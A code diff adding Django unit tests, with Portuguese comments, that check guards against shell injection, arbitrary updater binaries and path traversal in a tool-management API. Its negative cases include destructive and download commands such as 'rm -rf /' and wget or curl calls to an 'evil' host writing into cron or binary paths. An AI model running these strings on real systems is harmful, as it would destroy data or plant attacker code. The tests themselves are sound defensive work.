@@ -42,6 +42,53 @@ class ToolEndpointInputValidationTests(TestCase):
         self.assertEqual(resp.status_code, 504)
 
 
+class ToolCommandGuardTests(TestCase):
+    """Onda 2 (#13) — UpdateTool/UninstallTool compõem comandos a partir de campos
+    controlados por admin (update_command / install_command / github_clone_path).
+    Estes guards impedem que um campo adulterado vire RCE via shell / injeção de path."""
+
+    def test_has_shell_meta_flags_injection(self):
+        from api.views import _has_shell_meta
+        for bad in ['git pull; rm -rf /', 'a | b', 'x && y', '$(id)', '`id`',
+                    'a > /etc/x', 'a < b', 'foo\nbar', 'a & b']:
+            self.assertTrue(_has_shell_meta(bad), f'deveria bloquear: {bad!r}')
+
+    def test_has_shell_meta_allows_plain_commands(self):
+        from api.views import _has_shell_meta
+        for ok in ['git pull', 'go install github.com/projectdiscovery/nuclei/v3@latest',
+                   'pip install dnsvalidator', 'nuclei -update-templates', 'subfinder -up']:
+            self.assertFalse(_has_shell_meta(ok), f'não deveria bloquear: {ok!r}')
+
+    def test_safe_path_segment(self):
+        from api.views import _is_safe_path_segment
+        for ok in ['nuclei', 'sub-finder', 'tool_1', 'a.b']:
+            self.assertTrue(_is_safe_path_segment(ok), f'deveria aceitar: {ok!r}')
+        for bad in ['', '-rf', 'a/b', 'a;b', '../etc', 'a b', 'a$b']:
+            self.assertFalse(_is_safe_path_segment(bad), f'deveria rejeitar: {bad!r}')
+
+    def test_update_allowlist_blocks_arbitrary_binary(self):
+        # #13 (revisão adversarial): shell=False não basta — um comando sem metacaractere
+        # como 'wget ... -O /go/bin/httpx' ainda rodaria; o binário base tem de estar na allowlist.
+        from api.views import _update_command_base, ALLOWED_UPDATE_BINARIES
+        for bad in ['wget http://evil -O /go/bin/httpx', 'curl http://evil -o /etc/cron.d/x',
+                    'rm -rf /var/www', 'bash /tmp/x']:
+            self.assertNotIn(_update_command_base(bad), ALLOWED_UPDATE_BINARIES,
+                             f'binário arbitrário não deveria ser permitido: {bad!r}')
+        for ok in ['go install github.com/x/y@latest', 'git pull', 'nuclei -update',
+                   'pip3 install netlas', '/usr/local/bin/subfinder -up']:
+            self.assertIn(_update_command_base(ok), ALLOWED_UPDATE_BINARIES,
+                          f'updater legítimo deveria ser permitido: {ok!r}')
+
+    def test_contained_tool_path_blocks_traversal(self):
+        # #13b (revisão adversarial): startswith é driblável por '..'; exige filho direto.
+        from api.views import _is_contained_tool_path
+        self.assertTrue(_is_contained_tool_path('/usr/src/github/nuclei'))
+        for bad in ['/usr/src/github/../../../etc/nginx', '/usr/src/github/..',
+                    '/usr/src/github', '/etc/nginx', '/usr/src/github/a;b',
+                    '', '/usr/src/github/a/b']:
+            self.assertFalse(_is_contained_tool_path(bad), f'deveria rejeitar: {bad!r}')
+
+
 class ToolFetchTimeoutTests(TestCase):
     @patch('Suricatoos.common_func.requests.get')
     def test_reverse_whois_fetch_has_timeout(self, mock_get):
